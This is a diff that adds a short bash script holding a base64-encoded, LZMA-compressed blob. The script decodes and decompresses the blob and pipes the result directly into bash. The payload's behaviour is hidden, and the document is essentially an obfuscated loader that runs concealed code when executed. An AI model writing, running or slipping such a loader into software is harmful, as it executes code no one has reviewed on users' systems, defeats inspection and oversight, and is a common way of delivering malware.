@@ -1,0 +1,14 @@
+#!/bin/bash
+
+PAYLOAD=$(cat << 'EOF'
+XQAAAAT//////////wARiEJGPfQYaqZnr3qfb7t6hK4O3ZLE9kisPCkfNKjri/d16pHDXiK+9w5T
+JGbEAktW1mcYWvrsnG0QhICoxlHTLZz4llohrVm5eCfXamP58o6+YSRUoB/m1Ydc2Ma64Dk7tXV7
+yQ5GG0fg7atnDYF5bfZ8o2auzTQ/wO3nGKG26X7waTiX1oPoJpntNai02h4GcCfY44Cv7dh/N+WE
+el5uzIDnSWHxsM2UW5Df94dYhqGl6gON7BfP0dzoZDChhNeydOLkj263RtVrV45qsOW3+9SfuKs7
+MSEHKx846caEPMDd2CDKDZ/T1UMi8lyWNXvlIcFQQkxKHUJVYRKjWYX/9M4Svvx7Lq7tTFFG5QgC
+G4+tF+/UBcO9tabbFzGN2YPObKdVgymTVDMEpG1z+/jrJthuMWC8B7j2sIr9KxVhy4ZpYgmppXiw
+b6Pw5fsq8RtdYYXPUmalL4QpJAjWA5+GcWzhxEH4FI5ahCvtnH/O27L2lM8nIwsdjzBe5biGpKDv
+5NoE4b8JIcma1Rwy3SBdML8sEFvrwfLW/+4Rxmw=
+EOF
+)
+printf '%s' "$PAYLOAD" | base64 -d | lzma -d | bash
